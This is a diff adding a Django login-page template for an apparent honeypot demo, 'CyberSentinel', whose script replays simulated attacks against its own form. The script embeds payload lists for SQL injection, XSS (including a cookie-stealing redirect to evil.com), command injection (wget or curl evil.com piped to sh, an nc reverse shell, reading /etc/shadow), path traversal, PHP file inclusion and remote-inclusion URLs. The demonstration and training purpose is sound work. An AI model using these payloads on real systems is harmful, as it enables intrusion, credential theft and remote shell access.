@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Authentication | CyberSentinel</title>
+    <style>
+        :root {
+            --text-primary: #f5f8f6;
+            --text-secondary: #c8d2ca;
+            --text-muted: #9aa89c;
+            --green: #00ff41;
+            --green-soft: #7dffb4;
+            --red: #ff3131;
+            --yellow: #ffbd2e;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #0a0a0f;
+            color: var(--green);
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            overflow: hidden;
+        }
+
+        /* Animated grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image:
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            animation: gridScroll 20s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes gridScroll {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(30px, 30px); }
+        }
+
+        /* Scanlines */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.1) 0px,
+                rgba(0, 0, 0, 0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .page-wrap {
+            display: flex;
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+            z-index: 5;
+        }
+
+        .form-col {
+            flex: 0 0 440px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        .terminal-col {
+            flex: 1;
+            padding: 30px 30px 30px 10px;
+            display: none;
+        }
+        body.replay-mode .terminal-col { display: flex; flex-direction: column; }
+        body.replay-mode { overflow: auto; }
+        body.replay-mode .form-col { flex: 0 0 400px; }
+
+        .login-box {
+            position: relative;
+            background: rgba(10, 10, 15, 0.9);
+            backdrop-filter: blur(20px);
+            padding: 45px 40px;
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 4px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.08), inset 0 0 80px rgba(0, 255, 65, 0.02);
+            animation: slideIn 0.6s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: scale(0.95) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .login-header { text-align: center; margin-bottom: 35px; }
+
+        .lock-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        .login-header h3 {
+            font-size: 16px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+
+        .login-header p {
+            font-size: 10px;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .input-group { position: relative; margin: 20px 0; }
+
+        .input-group label {
+            display: block;
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            color: var(--green);
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+            border-radius: 2px;
+        }
+
+        .input-group input:focus {
+            border-color: var(--green);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.15);
+        }
+
+        .input-group input.attack-active {
+            border-color: var(--red);
+            box-shadow: 0 0 15px rgba(255, 49, 49, 0.3);
+            color: var(--red);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 25px;
+            background: transparent;
+            border: 1px solid var(--green);
+            color: var(--green);
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: bold;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        button:hover {
+            background: rgba(0, 255, 65, 0.08);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 10px;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+        }
+
+        .footer-text a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-text a:hover { color: var(--green); }
+
+        /* ==== Attack Replay Terminal ==== */
+        .replay-terminal {
+            background: rgba(5, 7, 10, 0.96);
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 4px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.08);
+        }
+
+        .replay-head {
+            background: rgba(0, 255, 65, 0.08);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+            padding: 10px 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .replay-head .dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+        }
+        .replay-head .dot.r { background: var(--red); }
+        .replay-head .dot.y { background: var(--yellow); }
+        .replay-head .dot.g { background: var(--green); }
+
+        .replay-head .title {
+            margin-left: 12px;
+            font-size: 11px;
+            letter-spacing: 2px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .replay-head .badge {
+            margin-left: auto;
+            padding: 3px 10px;
+            background: rgba(255, 49, 49, 0.15);
+            color: var(--red);
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            border: 1px solid rgba(255, 49, 49, 0.3);
+            font-weight: 700;
+        }
+
+        .replay-body {
+            flex: 1;
+            padding: 18px 20px;
+            font-size: 12px;
+            line-height: 1.8;
+            overflow-y: auto;
+            color: var(--text-primary);
+        }
+
+        .replay-line {
+            opacity: 0;
+            transform: translateX(-8px);
+            animation: lineIn 0.25s forwards;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        @keyframes lineIn {
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .replay-line .tag {
+            font-weight: 700;
+            margin-right: 8px;
+        }
+        .replay-line.info .tag { color: var(--green-soft); }
+        .replay-line.try .tag { color: var(--yellow); }
+        .replay-line.fail .tag { color: var(--red); }
+        .replay-line.fail .body { color: #ff7a7a; }
+        .replay-line.ok .tag { color: var(--green); }
+        .replay-line.ok .body { color: var(--green); font-weight: 700; }
+        .replay-line.warn .tag { color: #ff8a1a; }
+
+        .replay-status {
+            padding: 10px 20px;
+            border-top: 1px solid rgba(0, 255, 65, 0.15);
+            font-size: 11px;
+            color: var(--text-secondary);
+            letter-spacing: 1px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .replay-status .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0.2; }
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(0, 255, 65, 0.2); border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="page-wrap">
+        <div class="form-col">
+            <div class="login-box">
+                <div class="login-header">
+                    <div class="lock-icon">&#9919;</div>
+                    <h3>// SYSTEM_ACCESS</h3>
+                    <p>SESSION ID: {{ request.META.REMOTE_ADDR|default:"0.0.0.0" }} &mdash; ALL ACTIVITY LOGGED</p>
+                </div>
+
+                <form method="POST" id="loginForm">
+                    {% csrf_token %}
+                    <div class="input-group">
+                        <label>Username</label>
+                        <input type="text" name="username" id="uField" placeholder="Enter credentials..." autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" name="password" id="pField" placeholder="Enter password..." autocomplete="off">
+                    </div>
+                    <button type="submit">&gt; Authenticate</button>
+                </form>
+
+                <div class="footer-text">
+                    <a href="/">&lt; Back to Portal</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="terminal-col">
+            <div class="replay-terminal">
+                <div class="replay-head">
+                    <span class="dot r"></span>
+                    <span class="dot y"></span>
+                    <span class="dot g"></span>
+                    <span class="title">attacker@kali ~ <span id="replayMode">idle</span></span>
+                    <span class="badge" id="replayBadge">REPLAY</span>
+                </div>
+                <div class="replay-body" id="replayBody"></div>
+                <div class="replay-status">
+                    <span><span class="blink">&#9632;</span> <span id="replayState">initializing...</span></span>
+                    <span id="replayCounter">0 / 0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        const q = new URLSearchParams(window.location.search);
+        const mode = q.get('mode');
+        const manualPayload = q.get('payload') || '';
+
+        // Legacy path: ?u=X&p=Y&auto=1 still works
+        const legacyU = q.get('u');
+        const legacyP = q.get('p');
+        const legacyAuto = q.get('auto');
+
+        if (!mode && !legacyU && !legacyP) return;
+
+        document.body.classList.add('replay-mode');
+
+        const uEl = document.getElementById('uField');
+        const pEl = document.getElementById('pField');
+        const form = document.getElementById('loginForm');
+        const body = document.getElementById('replayBody');
+        const modeEl = document.getElementById('replayMode');
+        const stateEl = document.getElementById('replayState');
+        const countEl = document.getElementById('replayCounter');
+
+        function log(cls, tag, text) {
+            const d = document.createElement('div');
+            d.className = 'replay-line ' + cls;
+            d.innerHTML = '<span class="tag">[' + tag + ']</span><span class="body"></span>';
+            d.querySelector('.body').textContent = text;
+            body.appendChild(d);
+            body.scrollTop = body.scrollHeight;
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        async function typeInto(el, text, delay) {
+            el.classList.add('attack-active');
+            el.value = '';
+            for (const ch of text) {
+                el.value += ch;
+                await sleep(delay);
+            }
+        }
+
+        function submitFinal() {
+            stateEl.textContent = 'CREDS EXFILTRATED — SUBMITTING TO HONEYPOT...';
+            setTimeout(() => form.submit(), 500);
+        }
+
+        // ==== Legacy single-shot mode ====
+        if (legacyU || legacyP) {
+            uEl.value = legacyU || '';
+            pEl.value = legacyP || '';
+            uEl.classList.add('attack-active');
+            pEl.classList.add('attack-active');
+            if (legacyAuto === '1') form.submit();
+            return;
+        }
+
+        // ==== Attack sequences ====
+        const SEQUENCES = {
+            brute: {
+                label: 'BRUTE_FORCE',
+                username: 'admin',
+                payloads: [
+                    '123456', 'password', 'admin', 'qwerty', 'letmein',
+                    'welcome', 'root', 'toor', 'password123', 'admin123'
+                ],
+                typeDelay: 30,
+                attemptDelay: 450,
+            },
+            sqli: {
+                label: 'SQL_INJECTION',
+                payloads: [
+                    { u: "admin", p: "password" },
+                    { u: "admin' --", p: "x" },
+                    { u: "admin' OR '1'='1", p: "x" },
+                    { u: "' OR 1=1 --", p: "x" },
+                    { u: "admin' UNION SELECT 1,2,3 --", p: "x" },
+                    { u: "admin' OR '1'='1' --", p: "anything" },
+                    { u: "' OR ''='", p: "' OR ''='" },
+                    { u: "admin'; DROP TABLE users; --", p: "x" },
+                    { u: "admin' OR SLEEP(5) --", p: "x" },
+                    { u: "' UNION SELECT username, password FROM users --", p: "x" },
+                ],
+                typeDelay: 25,
+                attemptDelay: 600,
+            },
+            xss: {
+                label: 'XSS_INJECTION',
+                payloads: [
+                    { u: "<scr\x69pt>alert('XSS')<\/scr\x69pt>",                p: "test" },
+                    { u: "<img src=x onerror=alert(1)>",                         p: "test" },
+                    { u: "<svg onload=alert('XSS')>",                            p: "test" },
+                    { u: "javascript:alert(document.cookie)",                    p: "test" },
+                    { u: "<iframe src=javascript:alert(1)>",                     p: "test" },
+                    { u: "<body onload=alert('XSS')>",                           p: "test" },
+                    { u: "\"><scr\x69pt>alert(String.fromCharCode(88,83,83))<\/scr\x69pt>", p: "test" },
+                    { u: "<a href=javascript:alert(1)>click</a>",                p: "test" },
+                    { u: "<input onfocus=alert(1) autofocus>",                   p: "test" },
+                    { u: "<scr\x69pt>document.location='http://evil.com/c='+document.cookie<\/scr\x69pt>", p: "test" },
+                ],
+                typeDelay: 20,
+                attemptDelay: 550,
+            },
+            cmd: {
+                label: 'COMMAND_INJECTION',
+                payloads: [
+                    { u: "admin; whoami",                    p: "x" },
+                    { u: "admin | cat /etc/passwd",          p: "x" },
+                    { u: "admin && uname -a",                p: "x" },
+                    { u: "admin`id`",                        p: "x" },
+                    { u: "admin$(cat /etc/shadow)",          p: "x" },
+                    { u: "admin; netstat -an",               p: "x" },
+                    { u: "admin || ls -la /root",            p: "x" },
+                    { u: "admin; wget http://evil/shell.sh", p: "x" },
+                    { u: "admin; nc -e /bin/sh 1.2.3.4 4444", p: "x" },
+                    { u: "admin; curl evil.com | sh",        p: "x" },
+                ],
+                typeDelay: 25,
+                attemptDelay: 600,
+            },
+            traversal: {
+                label: 'PATH_TRAVERSAL',
+                payloads: [
+                    { u: "../../../../etc/passwd",              p: "x" },
+                    { u: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", p: "x" },
+                    { u: "../../../../etc/shadow",              p: "x" },
+                    { u: "%2e%2e/%2e%2e/%2e%2e/etc/passwd",     p: "x" },
+                    { u: "..%2f..%2f..%2fetc%2fpasswd",         p: "x" },
+                    { u: "/proc/self/environ",                  p: "x" },
+                    { u: "../../../../var/log/apache2/access.log", p: "x" },
+                    { u: "C:\\Windows\\win.ini",                p: "x" },
+                    { u: "....//....//etc/passwd",              p: "x" },
+                    { u: "/etc/hosts",                          p: "x" },
+                ],
+                typeDelay: 25,
+                attemptDelay: 550,
+            },
+            lfi: {
+                label: 'LFI_INCLUSION',
+                payloads: [
+                    { u: "php://filter/convert.base64-encode/resource=index", p: "x" },
+                    { u: "php://input",                         p: "<?php system($_GET[c]); ?>" },
+                    { u: "file:///etc/passwd",                  p: "x" },
+                    { u: "expect://id",                         p: "x" },
+                    { u: "zip://shell.zip#payload.php",         p: "x" },
+                    { u: "phar://archive.phar/payload.txt",     p: "x" },
+                    { u: "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==", p: "x" },
+                    { u: "/var/log/auth.log",                   p: "x" },
+                    { u: "php://filter/read=convert.base64-encode/resource=/etc/passwd", p: "x" },
+                    { u: "file:///proc/self/cmdline",           p: "x" },
+                ],
+                typeDelay: 20,
+                attemptDelay: 550,
+            },
+            rfi: {
+                label: 'RFI_INCLUSION',
+                payloads: [
+                    { u: "http://evil.example.com/shell.php",    p: "x" },
+                    { u: "https://attacker.com/payload.txt",     p: "x" },
+                    { u: "ftp://evil.com/backdoor.php",          p: "x" },
+                    { u: "http://185.199.108.153/shell.sh",      p: "x" },
+                    { u: "https://raw.githubusercontent.com/x/y/main/shell.php", p: "x" },
+                    { u: "http://pastebin.com/raw/abc123.php",   p: "x" },
+                    { u: "http://10.0.0.1/c.php",                p: "x" },
+                    { u: "https://127.0.0.1:8080/x.py",          p: "x" },
+                    { u: "http://evil.tk/r.pl",                  p: "x" },
+                    { u: "http://attacker.onion/shell.php",      p: "x" },
+                ],
+                typeDelay: 20,
+                attemptDelay: 550,
+            },
+            manual: {
+                label: 'MANUAL_LAB',
+                payloads: [{ u: manualPayload, p: manualPayload }],
+                typeDelay: 25,
+                attemptDelay: 500,
+            },
+        };
+
+        const seq = SEQUENCES[mode] || SEQUENCES.sqli;
+        modeEl.textContent = seq.label;
+
+        async function runBrute() {
+            stateEl.textContent = 'LOADING WORDLIST...';
+            log('info', 'INFO', 'Target: ' + window.location.origin + '/login/');
+            log('info', 'INFO', 'Wordlist loaded: ' + seq.payloads.length + ' entries');
+            log('info', 'INFO', 'Locked username: ' + seq.username);
+            await sleep(400);
+
+            uEl.classList.add('attack-active');
+            uEl.value = seq.username;
+
+            for (let i = 0; i < seq.payloads.length; i++) {
+                const pw = seq.payloads[i];
+                countEl.textContent = (i + 1) + ' / ' + seq.payloads.length;
+                stateEl.textContent = 'ATTEMPT ' + (i + 1) + ' IN PROGRESS...';
+                log('try', 'TRY', 'user=' + seq.username + '  pass=' + pw);
+                await typeInto(pEl, pw, seq.typeDelay);
+                await sleep(150);
+
+                const isLast = (i === seq.payloads.length - 1);
+                if (isLast) {
+                    log('ok', 'HIT', 'Credential pair matched → honeypot trap sprung');
+                    await sleep(300);
+                    submitFinal();
+                    return;
+                } else {
+                    log('fail', 'FAIL', 'HTTP 200 — auth rejected');
+                }
+                await sleep(seq.attemptDelay);
+            }
+        }
+
+        async function runPayloadSeq() {
+            stateEl.textContent = 'INJECTING PAYLOADS...';
+            log('info', 'INFO', 'Target: ' + window.location.origin + '/login/');
+            log('info', 'INFO', 'Vector: ' + seq.label);
+            log('info', 'INFO', 'Payload count: ' + seq.payloads.length);
+            await sleep(400);
+
+            for (let i = 0; i < seq.payloads.length; i++) {
+                const pl = seq.payloads[i];
+                countEl.textContent = (i + 1) + ' / ' + seq.payloads.length;
+                stateEl.textContent = 'PAYLOAD ' + (i + 1) + ' FIRING...';
+                log('try', 'FIRE', pl.u.slice(0, 90));
+                await typeInto(uEl, pl.u, seq.typeDelay);
+                await typeInto(pEl, pl.p, seq.typeDelay);
+                await sleep(150);
+
+                const isLast = (i === seq.payloads.length - 1);
+                if (isLast) {
+                    log('ok', 'HIT', 'Payload accepted by honeypot → exfil trigger');
+                    await sleep(300);
+                    submitFinal();
+                    return;
+                } else {
+                    log('fail', 'BLOCK', 'No visible reflection — retrying next vector');
+                }
+                await sleep(seq.attemptDelay);
+            }
+        }
+
+        // Kick off
+        setTimeout(() => {
+            if (mode === 'brute') runBrute();
+            else runPayloadSeq();
+        }, 300);
+    })();
+    </script>
+</body>
+</html>
